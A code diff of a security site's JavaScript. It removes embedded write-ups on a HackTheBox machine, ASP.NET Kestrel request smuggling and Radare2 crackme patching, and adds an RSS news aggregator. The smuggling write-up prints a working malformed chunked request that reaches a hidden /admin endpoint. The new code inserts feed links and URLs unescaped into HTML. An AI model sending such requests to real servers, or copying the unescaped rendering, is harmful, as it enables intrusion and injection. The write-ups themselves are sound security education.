-  <li><strong>Disable PHP PEAR</strong> in production environments, or restrict filesystem write permissions to prevent the <code>download</code> subcommand from writing to web-accessible directories.</li>
-  <li><strong>Enforce strong password policies</strong> and add rate-limiting / MFA on panel accounts. Never rely on bcrypt alone when the password behind it is <code>!QAZ2wsx</code>.</li>
-  <li><strong>Configure PAM correctly.</strong> Do not enable <code>user_readenv=1</code> unless you understand the Polkit privilege escalation consequences.</li>
-  <li><strong>Update udisks2</strong> to v2.10.0+ which applies <code>nosuid</code> during the resize window.</li>
-</ul>
-
-<div class="callout danger">
-  <div class="callout-title"><i class="fas fa-skull-crossbones"></i> Ethical Note</div>
-  <p>This machine was exploited inside the HackTheBox legal lab environment with explicit authorisation. Never apply these techniques to real systems without a written scope document and legal review.</p>
-</div>
-
-<div class="tag-row">
-  <span class="bb-tag">HackTheBox</span><span class="bb-tag">LFI</span><span class="bb-tag">PEAR</span>
-  <span class="bb-tag">CVE-2025-49132</span><span class="bb-tag">CVE-2025-6018</span><span class="bb-tag">CVE-2025-6019</span>
-  <span class="bb-tag">PAM</span><span class="bb-tag">udisks2</span>
-</div>`
-  },
-  {
-    id:'aspnet-smuggling',
-    n:'05',
-    t:'How I Found the Worst ASP.NET Vulnerability — $10K Bug (CVE-2025-55315)',
-    d:'HTTP request smuggling via malformed chunked extensions in ASP.NET Core Kestrel. CVSS 9.9 — the highest ever for ASP.NET.',
-    tags:['Bug Bounty','ASP.NET','Smuggling','CVE-2025-55315'],
-    time:'20 min',
-    diff:'hard',
-    plat:'bb',
-    content:`
-<h1>How I Found the Worst ASP.NET Vulnerability — $10K Bug (CVE-2025-55315)</h1>
-<div class="article-meta">
-  <span><i class="fas fa-bug"></i> Bug Bounty</span>
-  <span><i class="fas fa-signal"></i> Advanced</span>
-  <span><i class="fas fa-dollar-sign"></i> $10,000 bounty</span>
-  <span><i class="fas fa-clock"></i> 20 min read</span>
-</div>
-
-<p>Earlier this year I earned a <strong>$10,000 bounty from Microsoft</strong> after discovering a critical HTTP request smuggling vulnerability in ASP.NET Core's Kestrel server. The vulnerability, now tracked as <strong>CVE-2025-55315</strong>, received a <strong>CVSS score of 9.9</strong> — the highest severity rating ever assigned to an ASP.NET Core vulnerability. It made the front page of Hacker News. This is the full story of how I found it.</p>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-info-circle"></i> Quick Recap</div>
-  <p><strong>CVE:</strong> CVE-2025-55315 · <strong>CVSS:</strong> 9.9 (Critical) · <strong>Bounty:</strong> $10,000 · <strong>Component:</strong> Kestrel HTTP/1.1 parser · <strong>Class:</strong> HTTP Request Smuggling</p>
-</div>
-
-<h2>Request Smuggling Recap</h2>
-<p>HTTP request smuggling exploits ambiguities in how front-end (proxy, load balancer, CDN) and back-end (application server) systems determine where one HTTP request ends and the next begins. When the two disagree, an attacker can sneak a "smuggled" request through the front-end that the back-end processes as a separate, second request.</p>
-
-<p>The consequences are severe:</p>
-<ul>
-  <li><strong>Bypass front-end security controls</strong> — smuggle requests to endpoints blocked by WAF or access control</li>
-  <li><strong>Request hijacking</strong> — cause the back-end to append the next victim's request (including cookies, authorization headers, session tokens) to your smuggled request body. The server returns this sensitive data in the response — credential theft.</li>
-  <li><strong>Cache poisoning</strong> — smuggle requests that generate malicious responses for other users</li>
-</ul>
-
-<p>This is a systemic problem with HTTP/1.1. Minor parsing discrepancies between two systems become catastrophically exploitable.</p>
-
-<h2>Funky Chunks — The Research That Started It</h2>
-<p>My journey started with Jeppe's excellent research on request smuggling via <strong>chunked transfer encoding extensions</strong>. His technique exposed a new class of smuggling vulnerabilities caused by how HTTP parsers handle chunk extensions inconsistently.</p>
-
-<p>According to RFC 9112 section 7.1.1, chunk extension names must be valid token values. RFC 9110 section 5.6.2 explicitly defines tokens as excluding all control characters. But many implementations accept lone control characters such as <code>\n</code> (line feed) or <code>\r</code> (carriage return).</p>
-
-<p>Here's the crucial detail: a proxy that interprets <code>\n</code> as a line terminator will treat the bytes before it differently than a server that only looks for <code>\r\n</code>. That parsing discrepancy is the exploitable gap.</p>
-
-<h2>Discovery — Testing Kestrel</h2>
-<p>While testing different HTTP implementations, I found that ASP.NET Core's Kestrel server was vulnerable to request smuggling through malformed chunked transfer encoding extensions.</p>
-
-<p>I deployed a minimal ASP.NET Core app with a simple echo endpoint that reads and returns the request body, configured to use Kestrel as the web server. Then I sent the following malformed HTTP request with a lone <code>\n</code> embedded in the chunk extension:</p>
-
-<pre data-lang="http"><code>POST /one HTTP/1.1
-Host: victim
-Transfer-Encoding: chunked
-
-2;xx\nxx
-xy
-0
-
-GET /admin HTTP/1.1
-Host: victim
-Content-Length: 5
-
-x</code></pre>
-
-<p>The Kestrel server only echoed back <code>xy</code> — meaning <code>\nxx</code> was being treated as part of the chunk extension and NOT as a line terminator. The front-end proxy would interpret the <code>\n</code> as the end of the chunk extension line, then treat the bytes after it as the start of a new request.</p>
-
-<h2>Why This Creates Smuggling — TERM.EXT</h2>
-<p>This parsing leniency creates what security researchers call a <strong>TERM.EXT</strong> vulnerability. When Kestrel is deployed behind a front-end proxy that interprets the lone <code>\n</code> as a line terminator, request smuggling becomes possible. Here's how each part interprets the malformed request:</p>
-
-<h3>Front-end interpretation</h3>
-<ul>
-  <li>Sees <code>\n</code> after the semicolon → treats it as a line terminator</li>
-  <li><strong>Chunk 1:</strong> size 2, body <code>xx</code></li>
-  <li><strong>Chunk 2:</strong> size 45 (length of the smuggled request)</li>
-  <li>The <code>GET /admin</code> request is hidden inside what the proxy thinks is the body of chunk 2</li>
-  <li>Proxy only sees one request to <code>/one</code></li>
-</ul>
-
-<h3>Kestrel interpretation</h3>
-<ul>
-  <li>Treats <code>\n</code> as part of the chunk extension, not a terminator</li>
-  <li>Continues searching for the proper <code>\r\n</code> sequence</li>
-  <li>The <code>45\r\n0\r\n\r\n</code> sequence is consumed as part of the first chunk's extension and data</li>
-  <li>The <code>GET /admin</code> request is interpreted as a separate, second pipelined request</li>
-</ul>
-
-<p>The front-end proxy sees one request. Kestrel sees two. The second — <code>GET /admin</code> — was never supposed to reach the backend, but does.</p>
-
-<h2>Source Code Analysis</h2>
-<p>My colleague Wei Lin Ngo pointed out that the vulnerability was likely in Kestrel's chunk parsing implementation. He was right. The bug was in the <code>ParseExtension</code> method of the <code>Http1ChunkedEncodingMessageBody</code> class:</p>
-
-<pre data-lang="csharp"><code>extensionCursorPosition = buffer.PositionOfAny(ByteCR, ByteLF);
-if (suffixSpan[0] == ByteCR &amp;&amp; suffixSpan[1] == ByteLF)
-{
-    // Valid CRLF sequence
+const NEWS_SOURCES = [
+  { id:'thn',   name:'The Hacker News', short:'THN',   url:'https://thehackernews.com/feeds/posts/default', color:'thn' },
+  { id:'krebs', name:'Krebs on Security', short:'KREBS', url:'https://krebsonsecurity.com/feed/', color:'krebs' },
+  { id:'dr',    name:'Dark Reading', short:'DR',  url:'https://www.darkreading.com/rss.xml', color:'dr' },
+  { id:'bc',    name:'BleepingComputer', short:'BC', url:'https://www.bleepingcomputer.com/feed/', color:'bc' },
+  { id:'sw',    name:'SecurityWeek', short:'SW', url:'https://www.securityweek.com/feed/', color:'sw' },
+];
+
+const CORS_PROXIES = [
+  url => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url),
+  url => 'https://corsproxy.io/?' + encodeURIComponent(url),
+  url => 'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(url),
+];
+
+const CACHE_KEY = 'hacking_arsenal_news_v1';
+const CACHE_TTL = 5 * 60 * 1000; // 5 minutes
+
+let allNews = [];
+let filteredNews = [];
+let currentSource = 'all';
+let currentSearch = '';
+let isRefreshing = false;
+
+/* ─── FETCH WITH PROXY FALLBACK ─── */
+async function fetchWithProxy(url){
+  for (const proxyFn of CORS_PROXIES){
+    try {
+      const r = await fetch(proxyFn(url), { signal: AbortSignal.timeout(10000) });
+      if (!r.ok) continue;
+      const text = await r.text();
+      if (text && text.length > 100) return text;
+    } catch(e){ /* try next proxy */ }
+  }
+  throw new Error('All proxies failed');
 }
-else
-{
-    // Invalid - reject the request
-    KestrelBadHttpRequestException.Throw(RequestRejectionReason.BadChunkExtension);
-}</code></pre>
-
-<p>The vulnerable code searched <em>only</em> for the <code>\r</code> (carriage return) character — actually the <code>PositionOfAny</code> call searched for either CR or LF, but the validation logic only accepted the paired sequence. If a chunk extension contained a lone <code>\n</code>, Kestrel treated it as part of the extension and continued searching for the full <code>\r\n</code> sequence. Meanwhile, many proxies interpret a lone <code>\n</code> as a line terminator — the parsing discrepancy needed for the attack.</p>
-
-<p>The fix introduced proper validation: search for both <code>\r</code> and <code>\n</code>, and reject requests with unpaired line terminators. Microsoft also added a compatibility flag <code>InsecureChunkedParsing</code> to allow organisations to temporarily revert if needed — a common practice when patching foundational server behaviour.</p>
-
-<h2>Understanding the 9.9 CVSS Score</h2>
-<p>When Microsoft released CVE-2025-55315, the 9.9 severity rating sparked community debate. It made the front page of Hacker News, with many questioning whether such a high score was appropriate.</p>
-
-<p>Here's the nuance: CVSS was designed for singular systems, not reusable components. For a library like Kestrel, impact varies dramatically based on how each downstream application deploys it. Microsoft scored based on worst-case scenarios — a Kestrel app behind a vulnerable front-end proxy with sensitive endpoints reachable via smuggling.</p>
-
-<p>The high severity rating was primarily about <strong>signalling urgency to downstream users</strong>. With the vulnerability present for years across multiple ASP.NET Core versions, the conservative scoring helped ensure organisations prioritised patching quickly, regardless of their specific risk profile.</p>
-
-<p>It's also important to note that request smuggling vulnerabilities are highly situational. Their exploitability depends on the entire web architecture:</p>
-<ul>
-  <li>Specific proxy/load balancer configuration</li>
-  <li>HTTP protocol version (HTTP/1.1 vs HTTP/2)</li>
-  <li>Connection pooling configuration</li>
-  <li>Backend application logic</li>
-</ul>
 
-<h2>Community Impact & Detection</h2>
-<h3>Burp Suite Integration</h3>
-<p>Following this discovery, I contributed to PortSwigger's official HTTP Request Smuggler extension for Burp Suite. The latest version (v3.0.2) now includes detection capabilities for request smuggling via chunked transfer encoding extensions, making it easier for security researchers to identify these issues in their own testing.</p>
+/* ─── PARSE RSS XML ─── */
+function parseRSS(xmlText, source){
+  const parser = new DOMParser();
+  const doc = parser.parseFromString(xmlText, 'text/xml');
+  
+  if (doc.querySelector('parsererror')) throw new Error('XML parse error');
+  
+  // Handle both RSS and Atom formats
+  let items = doc.querySelectorAll('item');
+  if (!items.length) items = doc.querySelectorAll('entry');
+  
+  const news = [];
+  items.forEach(item => {
+    const getText = (tag) => {
+      const el = item.querySelector(tag);
+      if (!el) return '';
+      // Handle CDATA
+      return (el.textContent || '').trim();
+    };
+    const getLink = () => {
+      const link = item.querySelector('link');
+      if (!link) return '';
+      return link.getAttribute('href') || link.textContent || '';
+    };
+    const getImage = () => {
+      // Try multiple image sources
+      const mediaContent = item.querySelector('content[url]');
+      if (mediaContent) return mediaContent.getAttribute('url');
+      const mediaThumb = item.querySelector('thumbnail[url]');
+      if (mediaThumb) return mediaThumb.getAttribute('url');
+      const enclosure = item.querySelector('enclosure[url]');
+      if (enclosure) return enclosure.getAttribute('url');
+      // Try parsing first image from content
+      const content = getText('description') || getText('content') || getText('summary');
+      const imgMatch = content.match(/<img[^>]+src=["']([^"']+)["']/i);
+      if (imgMatch) return imgMatch[1];
+      return null;
+    };
+    const getDescription = () => {
+      let desc = getText('description') || getText('summary') || getText('content');
+      // Strip HTML
+      desc = desc.replace(/<[^>]+>/g, ' ').replace(/&[^;]+;/g, ' ').replace(/\s+/g, ' ').trim();
+      return desc.slice(0, 300);
+    };
+    
+    const title = getText('title');
+    const link = getLink();
+    const pubDate = getText('pubDate') || getText('published') || getText('updated') || new Date().toISOString();
+    const author = getText('author') || getText('dc:creator') || source.name;
+    
+    if (!title || !link) return;
+    
+    news.push({
+      id: source.id + '_' + btoa(link).slice(0, 20),
+      title: title.slice(0, 200),
+      link,
+      description: getDescription(),
+      image: getImage(),
+      date: pubDate,
+      dateParsed: new Date(pubDate).getTime() || Date.now(),
+      author: author.replace(/<[^>]+>/g, '').trim().slice(0, 60),
+      source: source.name,
+      sourceShort: source.short,
+      sourceId: source.id,
+      color: source.color,
+    });
+  });
+  
+  return news;
+}
+
+/* ─── LOAD ALL FEEDS ─── */
+async function loadAllNews(forceRefresh = false){
+  if (isRefreshing) return;
+  isRefreshing = true;
+  
+  // Check cache
+  if (!forceRefresh){
+    try {
+      const cached = localStorage.getItem(CACHE_KEY);
+      if (cached){
+        const { data, ts } = JSON.parse(cached);
+        if (Date.now() - ts < CACHE_TTL && data.length > 0){
+          allNews = data;
+          applyFilters();
+          updateStats();
+          isRefreshing = false;
+          return;
+        }
+      }
+    } catch(e){}
+  }
+  
+  // Show loading
+  renderSkeletons(9);
+  const refreshBtn = $('refreshBtn');
+  refreshBtn.classList.add('spinning');
+  
+  try {
+    // Fetch all sources in parallel
+    const results = await Promise.allSettled(
+      NEWS_SOURCES.map(async src => {
+        const xml = await fetchWithProxy(src.url);
+        return parseRSS(xml, src);
+      })
+    );
+    
+    const news = [];
+    let successCount = 0;
+    results.forEach(r => {
+      if (r.status === 'fulfilled' && r.value.length){
+        news.push(...r.value);
+        successCount++;
+      }
+    });
+    
+    if (!news.length) throw new Error('No news loaded from any source');
+    
+    // Sort by date
+    news.sort((a,b) => b.dateParsed - a.dateParsed);
+    
+    allNews = news;
+    
+    // Cache
+    try {
+      localStorage.setItem(CACHE_KEY, JSON.stringify({
+        data: news.slice(0, 100),
+        ts: Date.now()
+      }));
+    } catch(e){}
+    
+    applyFilters();
+    updateStats();
+    updateTicker();
+    updateCVEWidget();
+    
+    toast(`Loaded ${news.length} articles from ${successCount} sources`, 'success');
+  } catch(e){
+    console.error(e);
+    // Try cached stale data as fallback
+    try {
+      const cached = localStorage.getItem(CACHE_KEY);
+      if (cached){
+        const { data } = JSON.parse(cached);
+        allNews = data;
+        applyFilters();
+        updateStats();
+        toast('Live fetch failed — showing cached data', 'error');
+      } else {
+        renderError('Unable to load news. Check your connection or try refreshing.');
+      }
+    } catch(err){
+      renderError('Unable to load news feeds.');
+    }
+  } finally {
+    isRefreshing = false;
+    refreshBtn.classList.remove('spinning');
+  }
+}
+
+/* ─── RENDER SKELETONS ─── */
+function renderSkeletons(n){
+  const grid = $('newsGrid');
+  grid.innerHTML = Array(n).fill(0).map(()=>`
+    <div class="news-skeleton">
+      <div class="sk-media"></div>
+      <div class="sk-body">
+        <div class="sk-line"></div>
+        <div class="sk-line"></div>
+        <div class="sk-line short"></div>
+      </div>
+    </div>`).join('');
+}
+
+/* ─── RENDER ERROR ─── */
+function renderError(msg){
+  $('newsGrid').innerHTML = `
+    <div class="news-empty">
+      <i class="fas fa-wifi"></i>
+      <h3>Unable to load feeds</h3>
+      <p>${msg}</p>
+      <button onclick="loadAllNews(true)">Retry Now</button>
+    </div>`;
+}
+
+/* ─── APPLY FILTERS ─── */
+function applyFilters(){
+  const q = currentSearch.toLowerCase().trim();
+  filteredNews = allNews.filter(n => {
+    const sourceMatch = currentSource === 'all' || n.sourceId === currentSource;
+    const searchMatch = !q || n.title.toLowerCase().includes(q) || n.description.toLowerCase().includes(q);
+    return sourceMatch && searchMatch;
+  });
+  renderNews(filteredNews);
+  renderNewsCats();
+}
+
+/* ─── RENDER NEWS ─── */
+function renderNews(items){
+  const grid = $('newsGrid');
+  
+  if (!items.length){
+    grid.innerHTML = `
+      <div class="news-empty">
+        <i class="fas fa-search"></i>
+        <h3>No articles found</h3>
+        <p>Try a different search or source filter</p>
+        <button onclick="clearNewsFilters()">Reset Filters</button>
+      </div>`;
+    return;
+  }
+  
+  grid.innerHTML = items.slice(0, 40).map((n, i) => {
+    const timeAgo = timeAgoFrom(n.dateParsed);
+    const imgHtml = n.image 
+      ? `<img src="${n.image}" alt="" loading="lazy" onerror="this.style.display='none'">`
+      : '';
+    return `
+      <article class="news-card" style="animation-delay:${Math.min(i*30, 600)}ms" onclick="openNews('${n.id}')">
+        <div class="nc-media">
+          <span class="nc-source-badge ${n.color}">${n.sourceShort}</span>
+          <span class="nc-time">${timeAgo}</span>
+          ${imgHtml}
+        </div>
+        <div class="nc-body">
+          <h3>${escapeHtml(n.title)}</h3>
+          <p>${escapeHtml(n.description)}</p>
+          <div class="nc-footer">
+            <span class="nc-author"><i class="fas fa-user"></i>${escapeHtml(n.author)}</span>
+            <span class="nc-read">Read <i class="fas fa-arrow-right"></i></span>
+          </div>
+        </div>
+      </article>`;
+  }).join('');
+}
+
+/* ─── OPEN NEWS ─── */
+function openNews(id){
+  const n = allNews.find(x => x.id === id);
+  if (!n) return;
+  window.open(n.link, '_blank', 'noopener');
+}
+
+/* ─── CLEAR FILTERS ─── */
+function clearNewsFilters(){
+  currentSource = 'all';
+  currentSearch = '';
+  $('newsSearch').value = '';
+  applyFilters();
+}
+
+/* ─── RENDER SOURCE CATS ─── */
+function renderNewsCats(){
+  const cats = [
+    { id:'all', name:'All Sources', count: allNews.length },
+    ...NEWS_SOURCES.map(s => ({
+      id: s.id,
+      name: s.short,
+      count: allNews.filter(n => n.sourceId === s.id).length
+    }))
+  ];
+  
+  $('newsCats').innerHTML = cats.map(c => `
+    <button class="ncat ${c.id === currentSource ? 'on' : ''}" data-source="${c.id}">
+      ${escapeHtml(c.name)}
+      <span class="count">${c.count}</span>
+    </button>
+  `).join('');
+  
+  $('newsCats').querySelectorAll('.ncat').forEach(btn => {
+    btn.addEventListener('click', () => {
+      currentSource = btn.dataset.source;
+      applyFilters();
+    });
+  });
+}
+
+/* ─── TIME AGO ─── */
+function timeAgoFrom(ts){
+  const diff = Date.now() - ts;
+  const mins = Math.floor(diff / 60000);
+  if (mins < 1) return 'now';
+  if (mins < 60) return mins + 'm ago';
+  const hrs = Math.floor(mins / 60);
+  if (hrs < 24) return hrs + 'h ago';
+  const days = Math.floor(hrs / 24);
+  return days + 'd ago';
+}
+
+/* ─── UPDATE STATS ─── */
+function updateStats(){
+  $('statTotal').textContent = allNews.length;
+  const cveCount = allNews.filter(n => 
+    /CVE-\d{4}-\d{4,}/i.test(n.title) || /CVE-\d{4}-\d{4,}/i.test(n.description)
+  ).length;
+  $('statCVE').textContent = cveCount;
+  const sourceCount = new Set(allNews.map(n => n.sourceId)).size;
+  $('statSources').textContent = sourceCount + '/5';
+  const now = new Date();
+  $('statSync').textContent = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
+}
+
+/* ─── UPDATE TICKER ─── */
+function updateTicker(){
+  const top = allNews.slice(0, 12);
+  const html = top.map(n => `
+    <span class="ticker-item" onclick="window.open('${n.link}','_blank','noopener')">
+      <span class="src">${n.sourceShort}</span>
+      ${escapeHtml(n.title.slice(0, 110))}
+    </span>
+  `).join('');
+  $('tickerTrack').innerHTML = html + html;
+}
+
+/* ─── UPDATE CVE WIDGET ─── */
+function updateCVEWidget(){
+  const cves = allNews.filter(n => /CVE-\d{4}-\d{4,}/i.test(n.title + ' ' + n.description)).slice(0, 6);
+  
+  if (!cves.length){
+    // Fallback: show top security stories
+    $('cveList').innerHTML = allNews.slice(0, 6).map(n => `
+      <div class="cve-item" onclick="window.open('${n.link}','_blank','noopener')">
+        <span class="cve-sev med">INFO</span>
+        <div style="flex:1;min-width:0">
+          <div class="cve-id">${escapeHtml(n.sourceShort)}</div>
+          <div class="cve-desc">${escapeHtml(n.title.slice(0, 90))}</div>
+        </div>
+      </div>
+    `).join('');
+    return;
+  }
+  
+  $('cveList').innerHTML = cves.map(n => {
+    const cveMatch = (n.title + ' ' + n.description).match(/CVE-\d{4}-\d{4,}/i);
+    const cveId = cveMatch ? cveMatch[0].toUpperCase() : n.sourceShort;
+    // Determine severity from title keywords
+    let sev = 'med';
+    const title = n.title.toLowerCase();
+    if (/critical|rce|remote code|zero.?day|0.?day/i.test(title)) sev = 'crit';
+    else if (/high|privilege|escalat|bypass/i.test(title)) sev = 'high';
+    
+    return `
+      <div class="cve-item" onclick="window.open('${n.link}','_blank','noopener')">
+        <span class="cve-sev ${sev}">${sev.toUpperCase()}</span>
+        <div style="flex:1;min-width:0">
+          <div class="cve-id">${escapeHtml(cveId)}</div>
+          <div class="cve-desc">${escapeHtml(n.title.slice(0, 90))}</div>
+        </div>
+      </div>`;
+  }).join('');
+}
+
+/* ─── ESCAPE HTML ─── */
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+/* ─── NEWS SEARCH ─── */
+let newsSearchTimer;
+$('newsSearch').addEventListener('input', (e) => {
+  currentSearch = e.target.value;
+  clearTimeout(newsSearchTimer);
+  newsSearchTimer = setTimeout(applyFilters, 250);
+});
+
+/* ─── REFRESH BUTTON ─── */
+$('refreshBtn').addEventListener('click', () => {
+  loadAllNews(true);
+});
+
+/* ═══════════════════════════════════════════════
+   TOOLS DATA
+   ═══════════════════════════════════════════════ */
 
-<h3>Chariot Detection</h3>
-<p>Our security product, Chariot, had already implemented detection for this class of vulnerabilities well before the CVE disclosure — a validation that our research methodology was ahead of the curve.</p>
-
-<h2>What Bounty Hunters Can Learn</h2>
-<ul>
-  <li><strong>Read RFCs carefully.</strong> Every parsing ambiguity between the spec and the implementation is potential smuggling.</li>
-  <li><strong>Study prior research.</strong> Jeppe's Funky Chunks work was the foundation. Build on top of published research.</li>
-  <li><strong>Test library code, not just apps.</strong> Frameworks and servers have the widest attack surface. A bug in Kestrel affects every ASP.NET Core app behind a proxy.</li>
-  <li><strong>Set up minimal reproductions.</strong> Echo endpoints, simple HTTP servers, and Burp Repeater are enough to find and confirm serious bugs.</li>
-  <li><strong>Contribute back.</strong> Adding detection to Burp's HTTP Request Smuggler benefits the whole community.</li>
-</ul>
-
-<h2>Timeline</h2>
-<table>
-  <tr><th>Date</th><th>Event</th></tr>
-  <tr><td>Early 2025</td><td>Research begins after reading Funky Chunks paper</td></tr>
-  <tr><td>Q1 2025</td><td>Kestrel vulnerability confirmed via minimal repro</td></tr>
-  <tr><td>Q1-Q2 2025</td><td>Report submitted to Microsoft via MSRC</td></tr>
-  <tr><td>Mid 2025</td><td>CVE-2025-55315 assigned, CVSS 9.9, patch released</td></tr>
-  <tr><td>Mid 2025</td><td>$10,000 bounty awarded</td></tr>
-  <tr><td>Q3 2025</td><td>Public technical writeup published</td></tr>
-</table>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-lightbulb"></i> Read the Original</div>
-  <p>Full technical deep-dive: <a href="https://www.praetorian.com/blog/how-i-found-the-worst-asp-net-vulnerability-a-10k-bug-cve-2025-55315/" target="_blank" rel="noopener">Praetorian — How I Found the Worst ASP.NET Vulnerability</a></p>
-</div>
-
-<div class="tag-row">
-  <span class="bb-tag">CVE-2025-55315</span><span class="bb-tag">ASP.NET</span><span class="bb-tag">Kestrel</span>
-  <span class="bb-tag">Request Smuggling</span><span class="bb-tag">HTTP/1.1</span><span class="bb-tag">$10K</span>
-</div>`
-  },
-  {
-    id:'radare2-reversing',
-    n:'06',
-    t:'Reverse Engineering & Patching Executables with Radare2',
-    d:'Extract a hidden password from a binary, patch the executable, and bypass authentication using Radare2 on Debian Linux.',
-    tags:['Reverse Engineering','Radare2','Crackme','Linux'],
-    time:'24 min',
-    diff:'medium',
-    plat:'re',
-    content:`
-<h1>Reverse Engineering & Patching Executables with Radare2</h1>
-<div class="article-meta">
-  <span><i class="fas fa-microchip"></i> Reverse Engineering</span>
-  <span><i class="fas fa-signal"></i> Intermediate</span>
-  <span><i class="fas fa-linux"></i> Debian Linux</span>
-  <span><i class="fas fa-clock"></i> 24 min read</span>
-</div>
-
-<p>In this guide we'll use <strong>Radare2</strong> — a powerful open-source reverse-engineering framework — to uncover a password hidden inside a binary, then patch the executable to trigger a function that would normally be inaccessible during correct program execution. We'll work on a crackme written specifically for this demonstration, available at <a href="https://github.com/yurembo/HackThisServer" target="_blank" rel="noopener">github.com/yurembo/HackThisServer</a>.</p>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-info-circle"></i> What We'll Cover</div>
-  <p>Static analysis · Function identification · Extracting embedded strings from disassembly · Patching binaries · Bypassing authentication checks</p>
-</div>
-
-<h2>Setting Up</h2>
-<p>All steps are performed on Debian Linux. First, install Radare2 if you don't already have it:</p>
-
-<pre data-lang="bash"><code><span class="g">git</span> <span class="w">clone https://github.com/radareorg/radare2</span>
-<span class="g">cd</span> <span class="w">radare2</span>
-<span class="g">sys/install.sh</span></code></pre>
-
-<p>Download the crackme, then open it in Radare2:</p>
-
-<pre data-lang="bash"><code><span class="g">r2</span> <span class="w">./hackthisserver</span></code></pre>
-
-<p>If you haven't analysed the binary yet, run <code>aaa</code> to perform full analysis (functions, strings, cross-references).</p>
-
-<h2>Understanding the Binary</h2>
-<p>When launched, this crackme opens a socket and listens on port 14884. If you connect with netcat, you're greeted with a prompt asking for a username or password. Entering an incorrect password terminates the session.</p>
-
-<pre data-lang="bash"><code><span class="g">nc</span> <span class="w">localhost 14884</span></code></pre>
-
-<p>Using Radare2's core capabilities, we've already identified the interesting functions in a previous session: <code>main</code>, <code>authenticate</code>, <code>check_username</code>, <code>check_password</code>, and <code>start_server</code>.</p>
-
-<p>The <code>authenticate</code> function contains five local variables and calls <code>check_username</code>, passing the value of the <code>fd</code> variable as its sole argument. This is a cornerstone function in the protection mechanism because it calls several other critical functions that aren't always directly related to the login procedure.</p>
-
-<h2>Username Recognition — Digging Into check_username</h2>
-<p>Let's disassemble <code>check_username</code> to understand how the program validates input:</p>
-
-<pre data-lang="bash"><code><span class="g">pdf</span> <span class="w">@ sym.check_username</span></code></pre>
-
-<p>In this function, the socket descriptor passed as an argument is stored in the <code>fildes</code> variable. A memory buffer is prepared using <code>memset</code>, then <code>read</code> pulls user input from the socket into that buffer. Next, <code>printf</code> writes the string <code>[+]</code> to the console, and <code>fputs</code> writes the buffer contents to the same console.</p>
-
-<p>The crucial part is what happens next. After preparing parameters for <code>strcpy</code> to copy the username from <code>src</code> into a new memory region <code>dest</code>, at offset <strong>0x1628</strong> the value <code>0x6262616a</code> is copied into variable <code>var_420h</code>.</p>
-
-<p>Radare2 helpfully leaves a comment:</p>
-
-<pre data-lang="assembly"><code>mov dword [var_420h], 0x6262616a ; 'jabb'</code></pre>
-
-<p>According to Radare2, this hexadecimal value is a sequence of letters encoded in UTF-8. Let's verify with the built-in conversion command:</p>
-
-<pre data-lang="bash"><code><span class="g">?</span> <span class="w">0x6262616a</span></code></pre>
-
-<p>Radare2 displays conversions for every data type. We care about the <strong>string</strong> interpretation. Next to it we see <code>jabb</code> — exactly as expected.</p>
-
-<p>Continuing at offset <strong>0x1632</strong>, we see character <code>a</code> stored in <code>var_21ch</code>. The comments at the top of the function show:</p>
-
-<pre data-lang="assembly"><code>; var int64_t var_41ch @ rbp-0x41c
-; var int64_t var_420h @ rbp-0x420</code></pre>
-
-<h2>Determining Buffer Sizes</h2>
-<p>The key insight is how to determine the size of <code>var_420h</code>. In UTF-8, Latin characters occupy one byte. The value <code>0x6262616a</code> consists of four bytes (<code>62 62 61 6a</code> = <code>b b a j</code>), confirming the destination buffer size is a <strong>dword</strong> (4 bytes).</p>
-
-<p>Because stack variables are placed from higher addresses to lower ones (the stack grows downward), we can determine the size of <code>var_420h</code> by subtracting the address of the next variable:</p>
-
-<pre data-lang="output"><code>0x420 – 0x41C = 4 bytes</code></pre>
-
-<p>This confirms the variable is 4 bytes. Radare2 created <code>var_41ch</code> during disassembly for convenience, because there's no way to copy exactly 5 bytes — the code writes 4 bytes to <code>var_420h</code> and then 1 byte (<code>a</code>) to the adjacent <code>var_41ch</code>.</p>
-
-<p>Together, <code>var_420h</code> (4 bytes) + <code>var_41ch</code> (1 byte) contain the string: <strong>jabba</strong>.</p>
-
-<p>Now we know the username: <strong>jabba</strong>.</p>
-
-<h2>Username Comparison Logic</h2>
-<p>The code continues at offset <strong>0x163b</strong>. It prepares parameters for a function call — pointers to <code>var_420h</code> and <code>dest</code>. The latter contains a copy of the value previously entered by the user. These two values are passed to <code>compare_username</code>.</p>
-
-<pre data-lang="bash"><code><span class="g">pdf</span> <span class="w">@ sym.compare_username</span></code></pre>
-
-<p>This function is short. The string arguments are copied into variables — the user-supplied string into <code>src</code>, and <code>jabba</code> into <code>s2</code>. Memory is allocated for both with 8 bytes each (one qword).</p>
-
-<p>The server-side console displays <code>[-]</code>, then <code>src</code> is copied into <code>dest</code> — a trick to remove the <code>const</code> qualifier from the string. Then both strings are prepared for <code>strcmp</code>.</p>
-
-<p>Recall what <code>strcmp</code> returns:</p>
-<ul>
-  <li><strong>0</strong> when the strings are identical</li>
-  <li><strong>positive</strong> when the first string is greater</li>
-  <li><strong>negative</strong> when the second is greater</li>
-</ul>
-
-<p>After returning from <code>strcmp</code>, the <code>test</code> instruction checks the <code>EAX</code> register which contains the comparison result. If nonzero (strings not equal), execution jumps to an instruction that sets <code>EAX</code> (the return value) to <strong>0</strong>. If equal (<code>EAX</code> is zero), <code>EAX</code> is set to <strong>1</strong>.</p>
-
-<p>Back in <code>check_username</code>, execution continues at <strong>0x1654</strong> where it encounters another <code>test</code>. The logic here is reversed: if the value is <strong>0</strong>, strings don't match and the console prints <code>[+]</code>; if it's <strong>1</strong>, strings are equal and <code>[+]</code> is displayed anyway (a slightly confusing but common compiler output).</p>
-
-<p>If the username is incorrect, after printing "Wrong user", the program uses <code>CMP</code> to compare <code>fildes</code> with zero. They will never be equal — <code>fildes</code> always holds a socket descriptor. If it contains zero, an error must have occurred earlier, and execution would never reach this point. So the next <code>jne</code> condition is always true, <code>EAX</code> is set to zero, and the function exits.</p>
-
-<h2>Finding the Password</h2>
